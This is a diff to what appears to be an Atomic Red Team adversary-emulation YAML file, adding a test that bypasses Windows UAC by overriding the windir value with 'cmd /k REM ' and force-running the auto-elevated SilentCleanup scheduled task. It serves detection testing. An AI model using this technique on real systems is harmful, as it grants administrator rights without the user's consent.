@@ -162,3 +162,29 @@ atomic_tests:
       reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
     name: command_prompt
     elevation_required: true
+- name: Bypass UAC using SilentCleanup task
+  auto_generated_guid: 28104f8a-4ff1-4582-bcf6-699dce156608
+  description: |
+    Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+    
+    There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+    
+    For example, we can set the windir registry kye to: "cmd /k REM "
+   
+    And forcefully run SilentCleanup task:
+    
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+    
+    REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: Path to the bat file
+      type: String
+      default: PathToAtomicsFolder\T1548.002\src\T1548.002.bat
+  executor:
+    command: |
+      #{file_path}
+    name: command_prompt
+    elevation_required: false
